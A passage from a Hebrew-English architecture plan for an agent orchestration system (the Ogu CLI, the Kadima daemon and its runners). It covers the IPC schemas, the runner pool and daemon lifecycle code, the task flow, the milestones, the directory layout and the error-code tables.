      const lock = JSON.parse(readFileSync(this.lockPath, 'utf8'));

      // Stale lock detection (holder crashed)
      if (Date.now() - new Date(lock.acquiredAt).getTime() > 60000) {
        console.warn(`[lock] Stale lock detected on ${this.lockPath}. Forcefully releasing.`);
        unlinkSync(this.lockPath);
        break;
      }

      if (Date.now() - start > timeoutMs) {
        throw new Error(`OGU5101: Lock timeout on ${this.lockPath}. Held by ${lock.holder}`);
      }

      await new Promise(r => setTimeout(r, 100));
    }

    this.holder = holder;
    writeFileSync(this.lockPath, JSON.stringify({
      holder,
      pid: process.pid,
      acquiredAt: new Date().toISOString()
    }));
  }

  release() {
    if (existsSync(this.lockPath)) {
      unlinkSync(this.lockPath);
    }
    this.holder = null;
  }
}
```

---

### Topology 3: IPC Protocol — Service Communication

כל התקשורת בין הסרביסים עוברת דרך **שני ערוצים**:

| Channel | From → To | Protocol | Purpose |
|---|---|---|---|
| File System | All ↔ All | Read/Write JSON files | Shared state, envelopes, audit logs |
| HTTP/Socket | CLI → Kadima | HTTP POST / Unix socket | Commands, queries |
| HTTP/Socket | Studio → Kadima | HTTP GET/POST | Dashboard data, control actions |
| Pipe/Spawn | Kadima → Runner | `child_process.fork()` | Task dispatch (Milestone 1-2) |
| HTTP Queue | Kadima → Runner | HTTP POST to runner pool | Task dispatch (Milestone 3) |
| WebSocket | Studio ← Filesystem | `fs.watch()` | Real-time event streaming |

**Schema: Command Protocol (CLI → Kadima)**

```json
{
  "$schema": "CommandRequest",
  "version": 1,
  "request": {
    "method": "POST",
    "path": "/api/command",
    "body": {
      "command": "agent:run",
      "args": {
        "featureSlug": "auth-flow",
        "taskId": "task-003",
        "dryRun": false
      },
      "cwd": "/Users/dev/my-project",
      "requestId": "req-uuid-1234",
      "timestamp": "2026-02-28T10:00:00Z"
    }
  },
  "response": {
    "status": 200,
    "body": {
      "requestId": "req-uuid-1234",
      "accepted": true,
      "taskId": "task-003",
      "estimatedStartMs": 5000,
      "queuePosition": 2
    }
  }
}
```

**Schema: Runner Dispatch (Kadima → Runner, Milestone 1-2)**

```javascript
// tools/kadima/runners/pool.mjs

import { fork } from 'child_process';
import { EventEmitter } from 'events';

export class RunnerPool extends EventEmitter {
  constructor(config, audit) {
    super();
    this.maxConcurrent = config.maxConcurrent;
    this.timeoutMs = config.timeoutMs;
    this.active = new Map(); // taskId → { process, startedAt }
    this.audit = audit;
  }

  availableSlots() {
    return this.maxConcurrent - this.active.size;
  }

  status() {
    return {
      maxConcurrent: this.maxConcurrent,
      active: this.active.size,
      available: this.availableSlots(),
      tasks: Array.from(this.active.entries()).map(([id, info]) => ({
        taskId: id,
        pid: info.process.pid,
        startedAt: info.startedAt,
        elapsed: Date.now() - new Date(info.startedAt).getTime()
      }))
    };
  }

  async dispatch(inputEnvelope) {
    if (this.availableSlots() <= 0) {
      throw new Error('OGU5201: No available runner slots');
    }

    const { taskId } = inputEnvelope;

    // Write InputEnvelope to disk (Runner reads from file)
    writeFileSync(`.ogu/runners/${taskId}.input.json`,
      JSON.stringify(inputEnvelope, null, 2));

    // Fork runner process
    const child = fork('tools/runner/worker.mjs', [taskId], {
      cwd: process.cwd(),
      env: {
        ...filterEnv(inputEnvelope.sandbox_policy),
        OGU_TASK_ID: taskId,
        OGU_ISOLATION_LEVEL: inputEnvelope.isolationLevel
      },
      stdio: ['pipe', 'pipe', 'pipe', 'ipc']
    });

    this.active.set(taskId, {
      process: child,
      startedAt: new Date().toISOString()
    });

    // Timeout watchdog
    const timeout = setTimeout(() => {
      this.audit.emit('runner.timeout', { taskId, timeoutMs: this.timeoutMs });
      child.kill('SIGTERM');
    }, this.timeoutMs);

    child.on('exit', (code) => {
      clearTimeout(timeout);
      this.active.delete(taskId);
      this.audit.emit('runner.exit', { taskId, code });
      this.emit('task_complete', { taskId, exitCode: code });
    });

    child.on('message', (msg) => {
      if (msg.type === 'status') {
        this.emit('task_status', { taskId, status: msg.status });
      }
    });

    return { taskId, pid: child.pid };
  }

  async drainWithTimeout(timeoutMs) {
    if (this.active.size === 0) return;

    return new Promise((resolve) => {
      const check = setInterval(() => {
        if (this.active.size === 0) {
          clearInterval(check);
          resolve();
        }
      }, 500);

      setTimeout(() => {
        clearInterval(check);
        // Force kill remaining
        for (const [taskId, info] of this.active) {
          info.process.kill('SIGKILL');
          this.audit.emit('runner.force_killed', { taskId });
        }
        resolve();
      }, timeoutMs);
    });
  }
}
```

---

### Topology 4: Process Lifecycle — Startup, Health, Shutdown

**Startup sequence:**

```
$ ogu kadima:start

1. [ogu CLI] Check if .ogu/ exists and is valid
2. [ogu CLI] Check if kadima.pid already exists (prevent double-start)
3. [ogu CLI] Validate kadima.config.json
4. [ogu CLI] Spawn kadima-daemon.mjs as detached process
5. [kadima] Write PID to .ogu/kadima.pid
6. [kadima] Create Unix socket at .ogu/kadima.sock
7. [kadima] Start HTTP API on port 4200
8. [kadima] Start metrics endpoint on port 4201
9. [kadima] Initialize all background loops (scheduler, state machine, etc.)
10. [kadima] Emit audit: daemon.start
11. [kadima] Run initial consistency check
12. [ogu CLI] Poll /health until 200 (max 10s)
13. [ogu CLI] Print "Kadima daemon running (PID: 12345)"
```

**CLI commands for daemon management:**

```javascript
// tools/ogu/commands/kadima.mjs

export const commands = {
  'kadima:start': {
    description: 'Start the Kadima daemon',
    handler: async () => {
      if (await isDaemonRunning()) {
        return { error: 'OGU5301: Kadima already running', pid: readPid() };
      }

      const child = spawn('node', ['tools/kadima/daemon.mjs'], {
        cwd: process.cwd(),
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe']
      });

      child.unref();

      // Pipe initial output to log file
      child.stdout.pipe(createWriteStream('.ogu/logs/kadima.log', { flags: 'a' }));
      child.stderr.pipe(createWriteStream('.ogu/logs/kadima.log', { flags: 'a' }));

      // Wait for health check
      const healthy = await pollHealth('http://127.0.0.1:4200/health', 10000);
      if (!healthy) {
        throw new Error('OGU5302: Kadima failed to start within 10s');
      }

      return { status: 'started', pid: child.pid };
    }
  },

  'kadima:stop': {
    description: 'Stop the Kadima daemon gracefully',
    handler: async () => {
      if (!await isDaemonRunning()) {
        return { status: 'not_running' };
      }
      const pid = readPid();
      process.kill(pid, 'SIGTERM');
      // Wait for PID file to disappear (graceful shutdown)
      await waitForFileRemoval('.ogu/kadima.pid', 30000);
      return { status: 'stopped', pid };
    }
  },

  'kadima:status': {
    description: 'Show Kadima daemon status',
    handler: async () => {
      if (!await isDaemonRunning()) {
        return { status: 'stopped' };
      }
      const health = await fetch('http://127.0.0.1:4200/health').then(r => r.json());
      return health;
    }
  },

  'kadima:restart': {
    description: 'Restart the Kadima daemon',
    handler: async () => {
      await commands['kadima:stop'].handler();
      return commands['kadima:start'].handler();
    }
  },

  'kadima:logs': {
    description: 'Tail Kadima daemon logs',
    handler: async ({ follow }) => {
      if (follow) {
        return tail('.ogu/logs/kadima.log');
      }
      return readFile('.ogu/logs/kadima.log', 'utf8');
    }
  }
};
```

**Health check schema:**

```json
{
  "$schema": "KadimaHealthCheck",
  "response": {
    "status": "healthy | degraded | unhealthy",
    "uptime": 3600,
    "version": "0.1.0",
    "loops": [
      { "name": "scheduler", "running": true, "lastTick": "2026-02-28T10:00:05Z", "tickCount": 720 },
      { "name": "stateMachine", "running": true, "lastTick": "2026-02-28T10:00:00Z", "tickCount": 360 },
      { "name": "consistencyReconciler", "running": true, "lastTick": "2026-02-28T09:59:00Z", "tickCount": 60 },
      { "name": "metricsAggregator", "running": true, "lastTick": "2026-02-28T09:59:00Z", "tickCount": 60 },
      { "name": "knowledgeIndexer", "running": true, "lastTick": "2026-02-28T09:55:00Z", "tickCount": 12 },
      { "name": "circuitBreakerProbe", "running": true, "lastTick": "2026-02-28T09:59:30Z", "tickCount": 120 }
    ],
    "runners": {
      "maxConcurrent": 4,
      "active": 2,
      "available": 2,
      "tasks": [
        { "taskId": "task-007", "pid": 23456, "startedAt": "2026-02-28T09:58:00Z", "elapsed": 120000 },
        { "taskId": "task-008", "pid": 23457, "startedAt": "2026-02-28T09:59:30Z", "elapsed": 30000 }
      ]
    },
    "circuitBreakers": {
      "provider": "closed",
      "filesystem": "closed",
      "audit": "closed",
      "budget": "closed",
      "scheduler": "closed"
    },
    "systemMode": "normal",
    "pid": 12345
  }
}
```

---

### Topology 5: Task Lifecycle — End-to-End Flow

**Complete lifecycle of a task from human intent to merged code:**

```
Human writes Spec.md and runs:
  $ ogu transition plan_complete

   ┌─────────────────────────────────────────────────────────────┐
   │ PHASE 1: Intent (Human → CLI → State)                       │
   │                                                              │
   │ 1. CLI validates transition is legal (Closure 2)             │
   │ 2. CLI writes .ogu/state/features/auth.state.json            │
   │    { "currentState": "planned", "transitionedAt": "..." }    │
   │ 3. CLI emits audit: feature.transition                       │
   └──────────────────────┬──────────────────────────────────────┘
                          │
   ┌──────────────────────▼──────────────────────────────────────┐
   │ PHASE 2: Detection (Kadima Daemon polling loop)              │
   │                                                              │
   │ 4. State Machine loop reads auth.state.json                  │
   │ 5. Detects: state=planned, auto_transition=true              │
   │ 6. Evaluates trigger conditions from Closure 2 FSM           │
   │ 7. Transitions to "building" → writes updated state          │
   │ 8. Emits audit: feature.auto_transition                      │
   └──────────────────────┬──────────────────────────────────────┘
                          │
   ┌──────────────────────▼──────────────────────────────────────┐
   │ PHASE 3: Planning (Kadima Task Allocator)                    │
   │                                                              │
   │ 9.  Reads Plan.json DAG for "auth" feature                   │
   │ 10. Builds task list with dependencies                       │
   │ 11. Evaluates policies (Closure 1): risk tier, approvals     │
   │ 12. Checks budget (Phase 2): enough tokens for all tasks?    │
   │ 13. Assigns agents by capability match (Fix 6)               │
   │ 14. Acquires semantic locks (Closure 9) on target files      │
   │ 15. Injects RAG context (Closure 10) into each task          │
   │ 16. Writes tasks to .ogu/scheduler-state.json                │
   │ 17. Emits audit: scheduler.tasks_created                     │
   └──────────────────────┬──────────────────────────────────────┘
                          │
   ┌──────────────────────▼──────────────────────────────────────┐
   │ PHASE 4: Dispatch (Kadima Scheduler loop)                    │
   │                                                              │
   │ 18. Scheduler reads queue, sorts by WFQ virtual clock        │
   │ 19. Checks runner capacity: 2 of 4 slots available           │
   │ 20. Picks top 2 ready tasks (no unresolved blockedBy)        │
   │ 21. For each task:                                           │
   │     a. Build InputEnvelope (agent + context + budget + RAG)  │
   │     b. Write .ogu/runners/{taskId}.input.json                │
   │     c. Fork runner child process                             │
   │     d. Emit audit: scheduler.dispatch                        │
   └──────────────────────┬──────────────────────────────────────┘
                          │
   ┌──────────────────────▼──────────────────────────────────────┐
   │ PHASE 5: Execution (Ogu Runner — in forked process)          │
   │                                                              │
   │ 22. Runner reads InputEnvelope from disk                     │
   │ 23. Creates Git worktree (isolated branch)                   │
   │ 24. Sets up sandbox (L0-L3 based on isolation level)         │
   │ 25. Calls LLM API (Claude/GPT/etc via model router)         │
   │ 26. Receives code generation response                        │
   │ 27. Applies code changes to worktree                         │
   │ 28. Runs AST merge (Closure 9 — not line-based)              │
   │ 29. Validates artifacts (no eval(), no secrets, size limit)   │
   │ 30. Writes OutputEnvelope to .ogu/runners/{taskId}.output    │
   │ 31. Runner process exits                                     │
   └──────────────────────┬──────────────────────────────────────┘
                          │
   ┌──────────────────────▼──────────────────────────────────────┐
   │ PHASE 6: Completion (Kadima receives result)                 │
   │                                                              │
   │ 32. Kadima detects runner exit via child process event        │
   │ 33. Reads OutputEnvelope                                     │
   │ 34. Executes SAGA transaction (Closure 5):                   │
   │     a. Write audit entry                                     │
   │     b. Update budget (deduct tokens used)                    │
   │     c. Update allocation state                               │
   │     d. Merge worktree to feature branch                      │
   │     e. Release semantic locks                                │
   │     f. Update feature progress                               │
   │ 35. If all tasks done → transition to "built"                │
   │ 36. Run compilation gates (ogu compile)                      │
   │ 37. If gates pass → transition to "verified"                 │
   │ 38. Emits audit: feature.task_completed                      │
   └──────────────────────┬──────────────────────────────────────┘
                          │
   ┌──────────────────────▼──────────────────────────────────────┐
   │ PHASE 7: Observability (Studio — real-time)                  │
   │                                                              │
   │ 39. Studio WebSocket detects audit log change                │
   │ 40. Pushes event to connected browsers                       │
   │ 41. Dashboard updates: DAG view, health score, budget        │
   │ 42. If errors → alerts displayed in real-time                │
   └─────────────────────────────────────────────────────────────┘
```

---

### Milestone 1: Monolithic CLI (חודשים 1-2)

> **המטרה:** לגרום ל-Phases 0-4 לעבוד. אין daemons. הכל synchronous בתוך ה-CLI process.

**מה בונים:**

```
tools/
  contracts/                    ← NEW: Shared types
    schemas/
      input-envelope.mjs        ← Zod schema for InputEnvelope
      output-envelope.mjs       ← Zod schema for OutputEnvelope
      org-spec.mjs              ← Zod schema for OrgSpec
      feature-state.mjs         ← Zod schema for FeatureState
      agent-identity.mjs        ← Zod schema for AgentIdentity
      policy-rule.mjs           ← Zod schema for PolicyRule
      budget-entry.mjs          ← Zod schema for BudgetEntry
      audit-event.mjs           ← Zod schema for AuditEvent
    envelopes/
      input.mjs                 ← InputEnvelope builder
      output.mjs                ← OutputEnvelope builder
    errors/
      codes.mjs                 ← All OGU error codes (centralized)
      error.mjs                 ← OguError class
    index.mjs                   ← Re-exports
    package.json

  ogu/                          ← EXISTING: CLI (extends)
    commands/
      org.mjs                   ← NEW: org:init, org:show, org:validate
      agent.mjs                 ← NEW: agent:list, agent:show, agent:create, agent:run
      model-router.mjs          ← NEW: model:route, model:status
      budget.mjs                ← NEW: budget:status, budget:set, budget:report
      audit.mjs                 ← NEW: audit:show, audit:search
      governance.mjs            ← NEW: governance:check, approve, deny
      feature-state.mjs         ← NEW: feature:state, feature:lifecycle
      kadima.mjs                ← STUB: kadima:start prints "Daemon mode coming in Milestone 2"
    commands/lib/
      agent-registry.mjs        ← NEW: Agent loading + matching
      model-router.mjs          ← NEW: Routing logic
      budget-tracker.mjs        ← NEW: Budget enforcement
      audit-emitter.mjs         ← NEW: Structured JSONL audit
      policy-engine.mjs         ← NEW: Rule evaluation
      state-machine.mjs         ← NEW: Feature state transitions

  studio/                       ← EXISTING: Dashboard (extends)
    server/api/
      org.ts                    ← NEW: Org API routes
      agents.ts                 ← NEW: Agent API routes
      budget.ts                 ← NEW: Budget API routes
```

**Milestone 1 behavior:**

```
$ ogu agent:run --feature auth --task implement-login

  [ogu] No Kadima daemon detected. Running in standalone mode.
  [ogu] Loading OrgSpec... ✓
  [ogu] Evaluating policies... ✓ (2 rules matched, 0 blocked)
  [ogu] Checking budget... ✓ ($4.20 remaining of $50.00 daily)
  [ogu] Building InputEnvelope... ✓
  [ogu] Creating worktree: .worktrees/auth-implement-login
  [ogu] Calling Claude (claude-sonnet-4-20250514, via Anthropic)...
  [ogu] ... generating code (est. 2000 tokens)
  [ogu] Validating output... ✓
  [ogu] Merging to feature branch... ✓
  [ogu] Writing audit event... ✓
  [ogu] Updating budget... ✓ (1,847 tokens used, $0.37)
  [ogu] Done. Task implement-login completed.

  Close terminal? Everything stops. No daemon, no background work.
```

**What's different from today's Ogu:** Today, `ogu agent:run` doesn't exist. Skills run inside Claude Code sessions. Milestone 1 wraps the existing skill execution in a formal InputEnvelope/OutputEnvelope contract with budget, audit, and policy enforcement.

---

### Milestone 2: Kadima Daemon (חודשים 3-4)

> **המטרה:** המערכת רצה בזמן שאתה ישן. Auto-transitions, scheduling, multi-task.

**מה מוסיפים:**

```
tools/
  kadima/                       ← NEW: Daemon package
    daemon.mjs                  ← Main daemon entry point
    lib/
      config.mjs                ← Config loader
      audit.mjs                 ← Audit emitter (extends shared)
    loops/
      scheduler.mjs             ← Scheduler loop (Closure 6)
      state-machine.mjs         ← Auto-transition loop (Closure 2)
      consistency.mjs           ← Consistency reconciler (Closure 5)
      metrics.mjs               ← Metrics aggregator (Closure 8)
      knowledge.mjs             ← Knowledge indexer (Closure 10)
      circuit-breaker.mjs       ← Circuit breaker probe (Closure 7)
    api/
      router.mjs                ← HTTP API router
      middleware/
        auth.mjs                ← API key / local-only check
        rate-limit.mjs          ← Rate limiting
    runners/
      pool.mjs                  ← Runner pool (child_process.fork)
    package.json

  runner/                       ← NEW: Worker package
    worker.mjs                  ← Runner entry point
    lib/
      worktree.mjs              ← Git worktree management
      sandbox.mjs               ← Sandbox setup (L0-L3)
      llm-client.mjs            ← LLM API caller (model router client)
      ast-merge.mjs             ← AST-aware merge
      artifact-validator.mjs    ← Output validation
      envelope.mjs              ← Envelope reader/writer
    package.json
```

**Milestone 2 behavior:**

```
$ ogu kadima:start
  [kadima] Starting daemon (PID: 12345)...
  [kadima] Control API on http://127.0.0.1:4200
  [kadima] Unix socket at .ogu/kadima.sock
  [kadima] Scheduler loop: every 5s ✓
  [kadima] State machine loop: every 10s ✓
  [kadima] Consistency reconciler: every 60s ✓
  [kadima] Metrics aggregator: every 60s ✓
  [kadima] Ready.

$ ogu kadima:status
  Status: HEALTHY
  Uptime: 2h 15m
  Runners: 2/4 active
  Queue: 7 pending, 2 executing, 14 completed
  Budget: $23.50 remaining (daily)
  Health Score: 87/100

  Active tasks:
    task-012: auth/implement-oauth (Runner PID: 23456, 2m elapsed)
    task-013: auth/write-tests (Runner PID: 23457, 45s elapsed)

  Next scheduled:
    task-014: auth/update-docs (waiting for task-012)

  # You close the laptop. Come back in the morning:

$ ogu kadima:status
  Status: HEALTHY
  Uptime: 10h 3m
  Runners: 0/4 active
  Queue: 0 pending, 0 executing, 23 completed
  Budget: $12.10 remaining (daily)
  Health Score: 94/100

  Overnight summary:
    ✓ 9 tasks completed successfully
    ✗ 2 tasks failed (budget exhaustion → paused)
    ⚠ 1 task required human approval (cross-boundary change → waiting)
```

---

### Milestone 3: Distributed Runners (חודשים 5-6)

> **המטרה:** Scale אמיתי. Runners על שרתים נפרדים. MicroVM isolation.

**מה משתנה:**

```
tools/
  kadima/
    runners/
      pool.mjs                  ← MODIFIED: dispatch via HTTP queue, not fork()
      remote-adapter.mjs        ← NEW: HTTP client for remote runners
    lib/
      queue.mjs                 ← NEW: Task queue (Redis/PostgreSQL adapter)

  runner/
    server.mjs                  ← NEW: HTTP server wrapping worker.mjs
    lib/
      microvm.mjs               ← NEW: Firecracker/gVisor VM manager (Closure 12)
      egress-proxy.mjs          ← NEW: Network egress proxy
```

**Architecture change:**

```
Milestone 2:                              Milestone 3:

Kadima ──fork()──→ Runner (local)         Kadima ──HTTP──→ Queue (Redis/PG)
                                                    │
                                           ┌────────┴────────┐
                                           │                  │
                                      Runner A (AWS)    Runner B (GCP)
                                      (pulls from queue) (pulls from queue)
```

**Remote runner registration:**

```json
{
  "$schema": "RunnerRegistration",
  "runners": [
    {
      "id": "runner-local-1",
      "type": "local",
      "host": "localhost",
      "capabilities": ["code_generation", "testing", "review"],
      "maxConcurrent": 2,
      "isolationLevels": ["L0", "L1"]
    },
    {
      "id": "runner-aws-1",
      "type": "remote",
      "host": "https://runner-1.company.internal:8443",
      "capabilities": ["code_generation", "testing", "review", "security_audit"],
      "maxConcurrent": 8,
      "isolationLevels": ["L0", "L1", "L2", "L3"],
      "auth": { "type": "mtls", "certPath": "/etc/ogu/runner-aws-1.pem" }
    },
    {
      "id": "runner-gcp-1",
      "type": "remote",
      "host": "https://runner-2.company.internal:8443",
      "capabilities": ["code_generation", "testing"],
      "maxConcurrent": 4,
      "isolationLevels": ["L0", "L1", "L2"],
      "auth": { "type": "mtls", "certPath": "/etc/ogu/runner-gcp-1.pem" }
    }
  ]
}
```

**Queue adapter (replaces child_process.fork):**

```javascript
// tools/kadima/lib/queue.mjs

/**
 * Abstract queue interface.
 * Milestone 2: InMemoryQueue (scheduler-state.json)
 * Milestone 3: RedisQueue or PostgresQueue
 */
export class TaskQueue {
  constructor(adapter) {
    this.adapter = adapter;
  }

  async enqueue(inputEnvelope) {
    return this.adapter.push(inputEnvelope);
  }

  async dequeue() {
    return this.adapter.pop();
  }

  async peek(count = 10) {
    return this.adapter.peek(count);
  }

  async size() {
    return this.adapter.size();
  }
}

// Milestone 2 adapter — reads/writes JSON file
export class FileQueueAdapter {
  constructor(path = '.ogu/scheduler-state.json') {
    this.path = path;
  }

  async push(envelope) {
    const state = JSON.parse(await readFile(this.path, 'utf8'));
    state.queue.push({ ...envelope, enqueuedAt: new Date().toISOString() });
    await writeFile(this.path, JSON.stringify(state, null, 2));
  }

  async pop() {
    const state = JSON.parse(await readFile(this.path, 'utf8'));
    const task = state.queue.shift();
    await writeFile(this.path, JSON.stringify(state, null, 2));
    return task;
  }
}

// Milestone 3 adapter — uses Redis
export class RedisQueueAdapter {
  constructor(redisClient, queueName = 'ogu:tasks') {
    this.redis = redisClient;
    this.queueName = queueName;
  }

  async push(envelope) {
    await this.redis.rpush(this.queueName, JSON.stringify(envelope));
  }

  async pop() {
    const data = await this.redis.lpop(this.queueName);
    return data ? JSON.parse(data) : null;
  }
}
```

---

### Directory Layout: Physical Monorepo

```
/AI-Compiler                              ← Root (existing)
│
├── .ogu/                                 ← Runtime state (existing, extends)
│   ├── kadima.pid                        ← Daemon PID
│   ├── kadima.sock                       ← Unix socket
│   ├── kadima.config.json                ← Daemon config
│   ├── state/                            ← Feature + system state
│   ├── agents/                           ← Agent state + sessions
│   ├── runners/                          ← Runner I/O envelopes
│   ├── audit/                            ← Structured audit logs
│   ├── budget/                           ← Budget ledger
│   ├── policies/                         ← Policy rules + compiled AST
│   ├── locks/                            ← Semantic locks + transactions
│   ├── knowledge/                        ← Knowledge graph + embeddings
│   ├── circuit-breakers/                 ← CB state per domain
│   ├── snapshots/                        ← Company snapshots
│   └── logs/                             ← Daemon + runner logs
│
├── tools/
│   ├── ogu/                              ← CLI (User Plane) — EXISTING
│   │   ├── cli.mjs                       ← Entry point (enhanced: daemon-aware)
│   │   ├── commands/                     ← 40+ commands (extends)
│   │   └── commands/lib/                 ← Shared logic (extends)
│   │
│   ├── kadima/                           ← Daemon (Control Plane) — NEW
│   │   ├── daemon.mjs                    ← Entry point
│   │   ├── loops/                        ← Background loops (6)
│   │   ├── api/                          ← HTTP API router
│   │   ├── runners/                      ← Runner pool management
│   │   ├── lib/                          ← Daemon-specific logic
│   │   └── package.json
│   │
│   ├── runner/                           ← Worker (Data Plane) — NEW
│   │   ├── worker.mjs                    ← Entry point
│   │   ├── server.mjs                    ← HTTP server (Milestone 3)
│   │   ├── lib/                          ← Execution logic
│   │   └── package.json
│   │
│   ├── contracts/                        ← Shared types — NEW
│   │   ├── schemas/                      ← Zod schemas
│   │   ├── envelopes/                    ← Envelope builders
│   │   ├── errors/                       ← Error codes + classes
│   │   ├── index.mjs                     ← Re-exports
│   │   └── package.json
│   │
│   └── studio/                           ← Dashboard — EXISTING (extends)
│       ├── server/                       ← Express/Fastify (extends with proxy to Kadima)
│       └── src/                          ← React UI (extends with new views)
│
├── docs/
│   ├── vault/                            ← Architecture contracts (existing)
│   └── agentic_company_os_full/          ← Vision + this plan (existing)
│
└── .claude/
    └── skills/                           ← Ogu pipeline skills (existing)
```

---

### Bootstrap Sequence: Day One

**סדר הבנייה — בדיוק כמו הכלל "לא בונים דבר חדש לפני שמוצים את מה שכבר קיים":**

```
Week 1: tools/contracts/ (Shared foundation)
  Day 1: schemas/audit-event.mjs + errors/codes.mjs + errors/error.mjs
  Day 2: schemas/org-spec.mjs + schemas/agent-identity.mjs
  Day 3: schemas/input-envelope.mjs + schemas/output-envelope.mjs
  Day 4: schemas/feature-state.mjs + schemas/policy-rule.mjs + schemas/budget-entry.mjs
  Day 5: envelopes/input.mjs + envelopes/output.mjs + index.mjs + tests

Week 2: tools/ogu/commands/ (Phase 0-2 CLI)
  Day 1: org.mjs (org:init, org:show, org:validate)
  Day 2: agent.mjs (agent:list, agent:show, agent:create)
  Day 3: commands/lib/agent-registry.mjs + commands/lib/model-router.mjs
  Day 4: model-router.mjs CLI (model:route, model:status, model:providers)
  Day 5: budget.mjs (budget:status, budget:set, budget:report)

Week 3: tools/ogu/commands/ (Phase 3-4 CLI)
  Day 1: commands/lib/audit-emitter.mjs + audit.mjs
  Day 2: commands/lib/policy-engine.mjs
  Day 3: governance.mjs (governance:check, approve, deny)
  Day 4: commands/lib/state-machine.mjs + feature-state.mjs
  Day 5: Integration tests — full CLI flow

Week 4: tools/ogu/ (agent:run standalone)
  Day 1: commands/lib/envelope-builder.mjs
  Day 2: agent.mjs → agent:run (standalone mode, no daemon)
  Day 3: Integration: org:init → agent:run → audit:show → budget:report
  Day 4: Studio extensions: org, agents, budget API routes
  Day 5: End-to-end test: feature from idea to code in standalone mode

  === Milestone 1 complete ===

Week 5-6: tools/kadima/ (Daemon)
  Week 5: daemon.mjs + loops/ (scheduler, state-machine)
  Week 6: api/ + runners/pool.mjs + kadima CLI commands

Week 7-8: tools/runner/ (Worker)
  Week 7: worker.mjs + lib/ (worktree, sandbox, llm-client)
  Week 8: lib/ (ast-merge, artifact-validator, envelope)

  === Milestone 2 complete ===
```

**Day One command — right now:**

```bash
# Create the contracts package structure
mkdir -p tools/contracts/{schemas,envelopes,errors}

# Create package.json
cat > tools/contracts/package.json << 'EOF'
{
  "name": "@ogu/contracts",
  "version": "0.1.0",
  "type": "module",
  "exports": {
    ".": "./index.mjs",
    "./schemas/*": "./schemas/*.mjs",
    "./envelopes/*": "./envelopes/*.mjs",
    "./errors": "./errors/index.mjs"
  },
  "dependencies": {
    "zod": "^3.22.0"
  }
}
EOF

# Start coding: errors first (everything depends on error codes)
```

---

**Error codes for Iteration 7:**

| Code | Name | Severity | Description |
|---|---|---|---|
| OGU5001 | `RUNNER_GENERIC_ERROR` | error | Unhandled runner error |
| OGU5002 | `RUNNER_TIMEOUT` | error | Runner exceeded time limit |
| OGU5003 | `RUNNER_SANDBOX_VIOLATION` | critical | Runner tried to escape sandbox |
| OGU5004 | `RUNNER_LLM_CALL_FAILED` | error | LLM API call failed |
| OGU5005 | `RUNNER_ARTIFACT_INVALID` | error | Output artifact validation failed |
| OGU5101 | `LOCK_TIMEOUT` | error | File lock acquisition timeout |
| OGU5102 | `LOCK_STALE_DETECTED` | warn | Stale lock forcefully released |
| OGU5103 | `LOCK_DEADLOCK` | critical | Deadlock detected between locks |
| OGU5201 | `POOL_NO_SLOTS` | warn | No available runner slots |
| OGU5202 | `POOL_RUNNER_CRASHED` | error | Runner process exited unexpectedly |
| OGU5203 | `POOL_DRAIN_TIMEOUT` | warn | Runners didn't finish in drain period |
| OGU5301 | `DAEMON_ALREADY_RUNNING` | warn | Kadima daemon already active |
| OGU5302 | `DAEMON_START_FAILED` | critical | Daemon failed to start |
| OGU5303 | `DAEMON_LOOP_ERROR` | error | Background loop threw exception |
| OGU5304 | `DAEMON_SHUTDOWN_TIMEOUT` | warn | Graceful shutdown exceeded timeout |
| OGU5305 | `DAEMON_CONFIG_INVALID` | critical | kadima.config.json validation failed |
| OGU5401 | `IPC_CONNECTION_FAILED` | error | CLI cannot connect to daemon |
| OGU5402 | `IPC_COMMAND_REJECTED` | error | Daemon rejected command |
| OGU5403 | `IPC_TIMEOUT` | error | Command timed out |
| OGU5501 | `QUEUE_FULL` | warn | Task queue at capacity |
| OGU5502 | `QUEUE_PERSISTENCE_FAILED` | critical | Failed to persist queue state |
| OGU5601 | `REMOTE_RUNNER_UNREACHABLE` | error | Cannot connect to remote runner |
| OGU5602 | `REMOTE_RUNNER_AUTH_FAILED` | critical | mTLS / auth failure |
| OGU5603 | `REMOTE_RUNNER_CAPACITY_EXCEEDED` | warn | Remote runner at max capacity |

**כלל ברזל:** Physical Architecture לא מחליפה את Logical Architecture — היא **מממשת** אותה. כל Closure, Enhancement, Fix ו-Stone שהוגדרו באיטרציות 1-6 חיים בתוך 3 הסרביסים + CLI. הלוגיקה לא משתנה. מה שמשתנה זה *איפה* היא רצה ו*מתי* היא מופעלת. Scheduler logic → Kadima loop. AST merge → Runner process. Policy evaluation → Kadima API middleware. Audit → every service writes, Studio reads. File locks → shared filesystem. That's the bridge from document to code.

---

## סיכום: Iteration Map
| **Iter 2** | Provenance + Capability Marketplace | 11-12/10 | Attestation chain, test suites, canary routing |
| **Iter 3** | Org Evolution + Distributed Ready | 11.8/10 | Change proposals, runner abstraction, replay:full |
| **Iter 4** | 4 Formal Closures + 3 Enhancements | 12.6/10 | Policy AST, lifecycle v2, feature isolation, agent identity, KadimaAdapter, company snapshot, chaos injection |
| **Iter 5** | 4 OS Guarantees + 3 Enhancements | 13/10 | Consistency model, scheduler policy, failure domains, metrics layer, execution graph hash, deterministic mode, company freeze |
| **Iter 6** | The Absolute Horizon | 13/10 bulletproof | Semantic mutex + AST merge, knowledge graph + RAG, functional determinism, MicroVM isolation + egress proxy |
| **Iter 7** | Physical Architecture | 13/10 runnable | Service map, daemon lifecycle, runner pool, IPC protocol, persistence layout, 3 milestones, bootstrap sequence |

---

## סיכום: כל ה-Error Codes

| Range | Domain |
|---|---|
| OGU0001-1499 | Existing Ogu (14 gates) |
| OGU2001-2099 | OrgSpec & Agent Registry (Phase 0) |
| OGU2101-2199 | Model Router (Phase 1) |
| OGU2201-2299 | Budget System (Phase 2) |
| OGU2301-2399 | Audit Trail (Phase 3) |
| OGU2401-2499 | Governance Engine (Phase 4) |
| OGU2501-2599 | Kadima (Phase 5) |
| OGU2601-2699 | Agent Runtime (Phase 6) |
| OGU2701-2799 | Kadima ↔ Ogu Contract (Fix 1) |
| OGU2801-2899 | Feature State Machine (Fix 2) |
| OGU2901-2949 | Resource Governor (Fix 4) |
| OGU2951-2999 | Override System (Fix 5) |
| OGU3001-3099 | Capability Registry (Fix 6) |
| OGU3101-3199 | Performance Index (Fix 7) |
| OGU3201-3299 | Sandbox Policy (Fix 8) |
| OGU3301-3399 | SecretBroker (Stone 2) |
| OGU3401-3499 | Provenance & Attestations (Stone 3) |
| OGU3501-3599 | Runner Abstraction (Stone 6) |
| OGU3601-3699 | Policy AST & Determinism (Closure 1) |
